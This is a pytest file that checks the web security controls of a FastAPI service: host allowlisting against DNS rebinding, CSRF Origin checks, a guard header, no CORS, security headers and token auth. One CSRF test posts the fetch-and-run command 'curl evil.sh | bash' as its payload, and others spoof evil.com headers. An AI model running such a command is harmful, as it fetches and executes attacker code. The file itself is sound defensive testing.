"""ADR-0003's controls. These are the tests that justify making the API writable.

Each one names the control and the attack it closes, because in six months the
question will be "can I delete this middleware" and the answer needs to be
readable from the test names alone.
"""

from __future__ import annotations

from collections.abc import Iterator
from dataclasses import replace

import pytest
from fastapi.testclient import TestClient

from src.trainwatch.config import Config
from src.trainwatch.security import _host_only, _origin_host, _token_matches, resolve_allowed_hosts
from src.trainwatch.server.app import create_app

WRITE = {"X-Trainwatch": "1", "X-Trainwatch-Device": "test"}


@pytest.fixture
def client(cfg: Config) -> Iterator[TestClient]:
    with TestClient(create_app(cfg)) as c:
        yield c


# ── C1 · Host allowlist → DNS rebinding (the cross-origin READ) ──────────


def test_c1_unknown_host_is_refused(client: TestClient) -> None:
    """The severe attack: evil.com re-resolves to 100.x, so same-origin policy
    stops protecting the response body. It must send Host: 100.x, and a browser
    cannot forge Host — so this is the control that actually closes it."""
    r = client.get("/api/hub", headers={"Host": "evil.com"})
    assert r.status_code == 421
    assert "allowed" in r.json()


def test_c1_refusal_explains_itself(client: TestClient) -> None:
    """A bare 421 looks like a bug. It has to say what to do."""
    body = client.get("/api/hub", headers={"Host": "nope.example"}).json()
    assert "TRAINWATCH_ALLOWED_HOSTS" in body["why"]
    assert body["got"] == "nope.example"


def test_c1_allows_configured_and_local_hosts(client: TestClient) -> None:
    for host in ("testserver", "localhost", "127.0.0.1"):
        assert client.get("/healthz", headers={"Host": host}).status_code == 200


def test_c1_ignores_the_port(client: TestClient) -> None:
    assert client.get("/healthz", headers={"Host": "127.0.0.1:8730"}).status_code == 200


# ── C2 · Origin check → CSRF (the cross-origin WRITE) ────────────────────


def test_c2_cross_origin_write_is_refused(client: TestClient) -> None:
    """Without this, any page you visit can POST to the hub and poison your
    clipboard — you then paste the attacker's string into a shell."""
    r = client.post(
        "/api/clip",
        json={"body": "curl evil.sh | bash"},
        headers={**WRITE, "Origin": "https://evil.com"},
    )
    assert r.status_code == 403


def test_c2_cross_origin_read_is_refused(client: TestClient) -> None:
    r = client.get("/api/hub", headers={"Origin": "https://evil.com"})
    assert r.status_code == 403


def test_c2_same_origin_is_allowed(client: TestClient) -> None:
    r = client.post(
        "/api/clip",
        json={"body": "hello"},
        headers={**WRITE, "Origin": "http://testserver"},
    )
    assert r.status_code == 201


def test_c2_absent_origin_is_allowed_for_non_browser_clients(client: TestClient) -> None:
    """curl and the CLI send no Origin, and are not subject to CSRF."""
    assert client.post("/api/clip", json={"body": "from curl"}, headers=WRITE).status_code == 201


# ── C3 · guard header forces a preflight we never answer ─────────────────


def test_c3_write_without_the_guard_header_is_refused(client: TestClient) -> None:
    r = client.post("/api/clip", json={"body": "x"})
    assert r.status_code == 403
    assert "x-trainwatch" in r.json()["error"]


def test_c3_reads_do_not_need_the_guard_header(client: TestClient) -> None:
    assert client.get("/api/hub").status_code == 200


# ── C4 · no CORS headers, ever ───────────────────────────────────────────


def test_c4_no_cors_headers_on_any_response(client: TestClient) -> None:
    for path in ("/healthz", "/api/hub", "/api/state"):
        keys = {k.lower() for k in client.get(path).headers}
        assert not any(k.startswith("access-control-") for k in keys), path


def test_c4_preflight_is_refused_not_answered(client: TestClient) -> None:
    r = client.options("/api/clip", headers={"Origin": "https://evil.com"})
    assert r.status_code == 403
    assert "access-control-allow-origin" not in {k.lower() for k in r.headers}


# ── C5 · response hardening ──────────────────────────────────────────────


def test_c5_security_headers_are_present(client: TestClient) -> None:
    h = {k.lower(): v for k, v in client.get("/healthz").headers.items()}
    assert h["x-content-type-options"] == "nosniff"
    assert h["x-frame-options"] == "DENY"
    assert "frame-ancestors 'none'" in h["content-security-policy"]
    assert "script-src 'self'" in h["content-security-policy"]


def test_c5_csp_allows_no_remote_origins(client: TestClient) -> None:
    """Fonts are self-hosted precisely so this can stay tight."""
    csp = client.get("/healthz").headers["content-security-policy"]
    assert "https://" not in csp
    assert "'unsafe-eval'" not in csp


# ── C6 · optional token ──────────────────────────────────────────────────


def test_c6_token_gates_writes_but_not_reads(cfg: Config) -> None:
    with TestClient(create_app(replace(cfg, token="s3cret"))) as c:
        assert c.get("/api/hub").status_code == 200
        assert c.post("/api/clip", json={"body": "x"}, headers=WRITE).status_code == 401
        ok = c.post(
            "/api/clip",
            json={"body": "x"},
            headers={**WRITE, "Authorization": "Bearer s3cret"},
        )
        assert ok.status_code == 201


def test_c6_wrong_token_is_refused(cfg: Config) -> None:
    with TestClient(create_app(replace(cfg, token="s3cret"))) as c:
        r = c.post(
            "/api/clip",
            json={"body": "x"},
            headers={**WRITE, "Authorization": "Bearer wrong"},
        )
        assert r.status_code == 401


# ── helpers ──────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("100.69.221.23:8730", "100.69.221.23"),
        ("Foo.TS.NET", "foo.ts.net"),
        ("[::1]:8730", "[::1]"),
        ("[fd7a:115c::1]", "[fd7a:115c::1]"),
        ("", ""),
    ],
)
def test_host_only(raw: str, expected: str) -> None:
    assert _host_only(raw) == expected


@pytest.mark.parametrize(
    ("origin", "expected"),
    [("https://evil.com", "evil.com"), ("http://a:80", "a:80"), ("null", "null")],
)
def test_origin_host(origin: str, expected: str) -> None:
    assert _origin_host(origin) == expected


def test_opaque_origin_is_not_trusted(client: TestClient) -> None:
    """A sandboxed iframe or a data: URL sends `Origin: null`."""
    r = client.post("/api/clip", json={"body": "x"}, headers={**WRITE, "Origin": "null"})
    assert r.status_code == 403


def test_token_comparison_requires_bearer_scheme() -> None:
    assert _token_matches("Bearer abc", "abc")
    assert _token_matches("bearer abc", "abc")
    assert not _token_matches("Basic abc", "abc")
    assert not _token_matches("abc", "abc")
    assert not _token_matches("", "abc")


def test_allowlist_always_contains_localhost() -> None:
    hosts = resolve_allowed_hosts()
    assert "localhost" in hosts
    assert "127.0.0.1" in hosts


def test_extra_hosts_are_parsed_from_commas_or_spaces() -> None:
    hosts = resolve_allowed_hosts("a.example, b.example  c.example")
    assert {"a.example", "b.example", "c.example"} <= hosts
